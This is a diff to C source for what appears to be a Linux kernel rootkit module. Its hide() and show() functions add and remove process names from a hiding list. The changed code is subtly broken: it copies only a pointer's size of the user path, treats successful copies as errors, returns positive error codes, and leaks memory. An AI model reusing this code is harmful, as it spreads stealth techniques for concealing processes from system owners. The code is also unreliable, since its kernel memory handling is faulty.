@@ -17,19 +17,28 @@ static int deleteProcessToHide(char* processName);
 
 /* hide a directory entry */
 int hide(const char __user *path) {
+  char *_path;
   int result;
   char* tempPath;
   
   if (path == NULL)
     return EFAULT;
-  tempPath = kcalloc(strnlen_user(path, ~0) - strlen(hide__prefix),1,GFP_KERNEL);
+  _path = kcalloc(1, PATH_MAX, GFP_KERNEL);
+  result = strncpy_from_user(_path, path, sizeof(_path));
+  
+  if (result) {
+    kfree(_path);
+    return result < 0 ? -result : result;
+  }
+  tempPath = kcalloc(strlen(_path) - strlen(hide__prefix),1,GFP_KERNEL);
   if(IS_ERR_OR_NULL(tempPath)){
+    kfree(_path);
     return ENOMEM;
   }
-  copy_from_user(tempPath,path+strlen(hide__prefix), strnlen_user(path, ~0) - strlen(hide__prefix));
+  strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
   //      printk("%s",tempPath);
-printk(tempPath);
   result = addProcessToHide(tempPath);
+  kfree(_path);
   if(result == -ENOMEM)
     return ENOMEM;
   return 0;
@@ -124,20 +133,30 @@ int hide_init(struct sctm *sctm) {
 
 /* show a directory entry */
 int show(const char __user *path) {
-  char *tempPath;
+    char *_path;
+  int result;
+  char* tempPath;
   
   if (path == NULL)
     return EFAULT;
+  _path = kcalloc(1, PATH_MAX, GFP_KERNEL);
+  result = strncpy_from_user(_path, path, sizeof(_path));
   
-  if (IS_ERR(path))
-    return EINVAL;
-  tempPath = kcalloc(strnlen_user(path, ~0) - strlen(hide__prefix),1,GFP_KERNEL);
-  if(IS_ERR_OR_NULL(tempPath))
+  if (result) {
+    kfree(_path);
+    return result < 0 ? -result : result;
+  }
+  tempPath = kcalloc(strlen(_path) - strlen(hide__prefix),1,GFP_KERNEL);
+  if(IS_ERR_OR_NULL(tempPath)){
+    kfree(_path);
     return ENOMEM;
-  copy_from_user(tempPath,path+strlen(hide__prefix), strnlen_user(path, ~0) - strlen(hide__prefix));
+  }
+  strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
   //      printk("%s",tempPath);
-  deleteProcessToHide(tempPath);
-  kfree(tempPath);
+  result = deleteProcessToHide(tempPath);
+  kfree(_path);
+  if(result == -ENOMEM)
+    return ENOMEM;
   return 0;
 }
 
